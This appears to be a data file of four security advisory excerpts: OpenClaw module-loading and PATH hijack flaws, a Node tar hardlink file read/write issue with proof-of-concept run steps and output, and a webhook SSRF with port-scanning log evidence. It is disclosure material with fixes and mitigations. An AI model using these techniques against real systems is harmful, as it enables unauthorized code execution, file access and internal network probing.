In affected versions, the gateway did not sufficiently constrain configured module paths before passing them to dynamic `import()`. Under some configurations, a user who can modify gateway configuration could cause the gateway process to load and execute an unintended local module.\n\n## Impact\n\nPotential code execution in the OpenClaw gateway Node.js process.\n\nThis requires access that can modify gateway configuration (for example via the gateway config endpoints). Treat such access as high privilege.\n\n## Affected Packages / Versions\n\n- npm package: `openclaw`\n- Affected: `>= 2026.1.5` and `<= 2026.2.13`\n\n## Patched Versions\n\n- `>= 2026.2.14`\n\n## Fix Commit(s)\n\n- `a0361b8ba959e8506dc79d638b6e6a00d12887e4` (restrict hook transform module loading)\n- `35c0e66ed057f1a9f7ad2515fdcef516bd6584ce` (harden hooks module loading)\n\n## Mitigation\n\n- Upgrade to `2026.2.14` or newer.\n- Avoid exposing gateway configuration endpoints to untrusted networks.\n- Review config for unsafe values:\n  - `hooks.mappings[].transform.module`\n  - `hooks.internal.handlers[].module`\n\nThanks @222n5 for reporting.",

The PoC confirms shared inode and successful read+write via `exfil`.\n\n### PoC\n[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)\nEnvironment used for validation:\n\n- Node: `v25.4.0`\n- tar: `7.5.7`\n- OS: macOS Darwin 25.2.0\n- Extract options: defaults (`tar.extract({ file, cwd })`)\n\nSteps:\n\n1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.\n\n2. Run:\n\n```bash\nTAR_MODULE=\"$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)\" node hardlink.js\n```\n\n3. Expected vulnerable output (key lines):\n\n```text\nsame_inode=true\nread_ok=true\nwrite_ok=true\nresult=VULNERABLE\n```\n\nInterpretation:\n\n- `same_inode=true`: extracted `exfil` and external secret are the same file object.\n- `read_ok=true`: reading `exfil` leaks external content.\n- `write_ok=true`: writing `exfil` modifies external file.\n\n### Impact\nVulnerability type:\n\n- Arbitrary file read/write via archive extraction path confusion and link resolution.\n\nWho is impacted:\n\n- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.\n- Impact scope is the privileges of the extracting process user.\n\nPotential outcomes:\n\n- Read sensitive files reachable by the process user.\n- Overwrite writable files outside extraction root.\n- Escalate impact depending on deployment context (keys, configs, scripts, app data).",

This allows an attacker to force the server to make HTTP requests to arbitrary internal destinations.\n\n## Confirmed Attack Vectors\n\n### 1. Internal Port Scanning (Network Mapping)\nAttackers can map the internal network by observing the difference between successful connections and connection errors. This works even if the response body is not returned.\n\n**Proof of Exploitation (from Server Logs):**\n*   **Open Port (8890)**: The server connects successfully.\n    ```text\n    timestamp=... level=info message=\"webhook delivered successfully\" ... status_code=200\n    ```\n*   **Closed Port (8891)**: The server fails to connect.\n    ```text\n    timestamp=... level=error message=\"webhook delivery failed\" ... error=\"... connect: connection refused\"\n    ```\n\n**Impact**: An attacker can identify running services (databases, caches, internal apps) on the local network (e.g., `localhost`, `192.168.x.x`).\n\n### 2. Information Leakage (Error-Based)\nIf the internal service returns a non-2xx response (e.g., 403 Forbidden, 404 Not Found, 500 Error), the application **logs the full response body**.\n\n**Proof of Exploitation (from Server Logs):**\n```text\ntimestamp=... level=error message=\"webhook delivery failed\" ... \nresponse=\"{\\\"secret_key\\\": \\\"xxx123\\\", \\\"role\\\": \\\"admin\\\"}\"\n```\n\n**Impact**: An attacker can extract sensitive data by targeting endpoints that return errors or by forcing errors on internal services.\n\n## Technical Root Cause\n1.  **Missing Input Validation**: `cmd/webhooks.go` only checks if the URL is empty, not if it resolves to a private IP.\n2.  **Unrestricted HTTP Client**: `internal/webhook/webhook.go` uses a default `http.Client` that follows redirects and connects to any IP.\n3.  **Verbose Error Logging**: The application logs the full response body on failure, creating a side-channel for data exfiltration.\n\n## Remediation Required\nTo prevent this, the application must implement **Defense in Depth**:\n\n1.  **Input Validation**: Block URLs resolving to private IP ranges (RFC 1918) and Link-Local addresses.\n2.  **Safe HTTP Client**: Use a custom `http.Transport` that verifies the destination IP address *after* DNS resolution to prevent DNS rebinding attacks.",

In affected versions, this could cause OpenClaw to resolve and execute an unintended binary (\"command hijacking\") when running host commands.\n\nThis issue primarily matters when OpenClaw is relying on allowlist/safe-bin protections and expects `PATH` to be trustworthy.\n\n## Affected Packages / Versions\n\n- Package: `openclaw` (npm)\n- Affected: `< 2026.2.14`\n- Patched: `>= 2026.2.14` (planned next release)\n\n## What Is Required To Trigger This\n\n### A) Node Host PATH override (remote command hijack)\n\nAn attacker needs all of the following:\n\n- Authenticated/authorized access to an execution surface that can invoke node-host execution (for example, a compromised gateway or a caller that can issue `system.run`).\n- A node host connected and exposing `system.run`.\n- A configuration where allowlist/safe-bins are expected to restrict execution (this is not meaningful if full arbitrary exec is already allowed).\n- The ability to pass request-scoped environment overrides (specifically `PATH`) into `system.run`.\n- A way to place an attacker-controlled executable earlier in `PATH` (for example, a writable directory on the node host), with a name that matches an allowlisted/safe-bin command that OpenClaw will run.\n\nNotes:\n\n- OpenClaw deployments commonly require a gateway token/password (or equivalent transport authentication). This should not be treated as unauthenticated Internet RCE.\n- This scenario typically depends on **non-standard / misconfigured deployments** (for example, granting untrusted parties access to invoke node-host execution or otherwise exposing a privileged execution surface beyond the intended trust boundary).\n\n### B) Project-local PATH bootstrapping (local command hijack)\n\nAn attacker needs all of the following:\n\n- The victim runs OpenClaw from within an attacker-controlled working directory (for example, cloning and running inside a malicious repository).\n- That directory contains a `node_modules/.bin/openclaw` and additional attacker-controlled executables in the same directory.\n- OpenClaw subsequently executes a command by name (resolved via `PATH`) that matches one of those attacker-controlled executables.\n\n## Fix\n\n- Project-local `node_modules/.bin` PATH bootstrapping is now **disabled by default**. If explicitly enabled, it is **append-only** (never prepended) via `OPENCLAW_ALLOW_PROJECT_LOCAL_BIN=1`.\n- Node Host now ignores request-scoped `PATH` overrides.\n\n## Fix Commit(s)\n\n- 013e8f6b3be3333a229a066eef26a45fec47ffcc\n\nThanks @akhmittra for reporting.",
